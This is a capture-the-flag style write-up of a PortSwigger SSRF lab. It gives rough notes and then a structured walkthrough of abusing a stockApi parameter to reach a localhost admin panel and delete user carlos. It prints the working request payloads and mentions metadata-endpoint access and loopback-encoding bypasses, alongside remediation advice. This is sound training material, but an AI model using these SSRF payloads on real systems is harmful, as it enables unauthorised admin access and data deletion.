LAB : Basic SSRF against the local server

DATE: 2/5/2026

To solve a lab, i need to delete carlos and first access admin panel. 

First, i try to find vuln point and explore all application to find vulnerable point.

I choose a product, Us burp to intercept request and now i change staock use to localhost/admin and application display admin panle to me. 

But here i cannot delete carlos and application send response: 

"Admin interface only available if logged in as an administrator, or if requested from loopback "

I was confuse and find how to access admin panel.

First request is processs successfully bit second not. 
in first request i add url likhe: 
http://localhost/admin/delete?username=carlos

and i process successfully and i learn this lab: 

first request is profess but secn not then use first request as a first and last request.


---
---

# Lab Writeup: Basic SSRF Against the Local Server
**Category:** SSRF (Server-Side Request Forgery) | **Difficulty:** Apprentice | **Date:** 05/02/2026  
**Platform:** PortSwigger Web Security Academy

---

## Objective
Exploit an SSRF vulnerability to access the admin panel on the local server and delete user `carlos`.

---

## Vulnerability
**Server-Side Request Forgery (SSRF) — Against Local Server**  
CWE-918: Server-Side Request Forgery | OWASP A10:2021 — SSRF

SSRF happens when an application makes HTTP requests to a URL provided by the user, without properly validating where that URL points. If the server fetches a URL that the user controls, an attacker can point it at internal resources — like `localhost` — that would normally be inaccessible from the outside. Since the request comes from the server itself, it bypasses network-level restrictions. The local server often trusts requests from `127.0.0.1` as if they're coming from an administrator.

---

## How I Found It
First, I explored the entire application to understand its features. I was looking for any place where the application might be fetching a URL on my behalf.

I found it in the product pages — a "Check stock" feature. When I intercepted that request in Burp Suite, I noticed it sends a `stockApi` parameter containing a URL. That immediately stood out — the application was making a server-side request to whatever URL was in that parameter.

I thought: what if I change that URL to `http://localhost/admin`?

**Tool used:** Burp Suite Community Edition (Intercept + Repeater)

---

## Exploitation

**Step 1 — Find the vulnerable parameter**  
I selected a product and clicked "Check stock". In Burp Intercept, the request looked like this:

```
POST /product/stock HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

The `stockApi` parameter was a URL the server fetches. Classic SSRF entry point.

**Step 2 — Point it at localhost/admin**  
I modified `stockApi` to:
```
stockApi=http://localhost/admin
```

Full request:
```
POST /product/stock HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

Response: The server returned the admin panel HTML. I could see the admin interface in the response body, including a link to delete `carlos`.

**Step 3 — Try to delete Carlos directly**  
At first I tried navigating to the delete URL from my browser — it rejected me:
```
"Admin interface only available if logged in as an administrator, or if requested from loopback"
```

The key phrase: *"or if requested from loopback"*. The admin panel allows access from `localhost` (127.0.0.1) because it trusts local requests. My browser request doesn't come from localhost — but the server's SSRF request does.

**Step 4 — Delete Carlos via SSRF**  
I used the same SSRF technique to make the server call the delete endpoint on my behalf:

```
POST /product/stock HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin/delete?username=carlos
```

The server made the DELETE request from its own `localhost`. Since the admin panel trusts loopback requests, it processed the deletion.

**Lab Solved ✅**

---

## Why Does This Happen? (Root Cause)
Two problems combine to create this vulnerability:
1. **The application fetches user-supplied URLs** without validating whether the URL points to an internal or external resource.
2. **The admin panel trusts loopback requests** — any request from `127.0.0.1` is treated as coming from an administrator, with no authentication required.

When you combine these two, an external attacker can use the server as a proxy to talk to its own internal services.

---

## Impact
- Access to internal admin panels, APIs, or services not exposed publicly
- If cloud environment — access to metadata endpoints (e.g., `http://169.254.169.254/` on AWS) which can leak credentials
- Port scanning internal network
- Reading internal files via `file://` scheme (if not properly restricted)

**Severity: Critical**

---

## Remediation
1. **Allowlist valid URLs or domains:** The application should only allow `stockApi` to point to known, trusted external stock API domains. Block everything else.
2. **Block requests to internal addresses:** Deny requests to `localhost`, `127.0.0.1`, `169.254.x.x`, `10.x.x.x`, `172.16.x.x`, `192.168.x.x` at the server level.
3. **Admin panel should require authentication even from localhost:** The admin panel should not trust requests just because they come from `127.0.0.1`. Proper session-based authentication should be enforced on every request.
4. **Use a server-side allowlist approach** rather than a blocklist (blocklists can be bypassed with IP encoding tricks like `0x7f000001` or `127.1`).

---

## What I Learned
- Any parameter that contains a URL and causes the server to fetch it is a potential SSRF point. Always look for `url=`, `api=`, `stockApi=`, `webhook=`, etc.
- The error message was actually a hint: "*...or if requested from loopback*" told me exactly how the admin panel grants access.
- SSRF is powerful because it turns the server into your proxy — it can reach things your browser fundamentally cannot.
- Reading error messages carefully is part of the methodology. They often reveal internal logic.

---

## References
- [PortSwigger Lab: Basic SSRF Against the Local Server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
- [PortSwigger SSRF Learning Material](https://portswigger.net/web-security/ssrf)
- [OWASP A10:2021 — SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
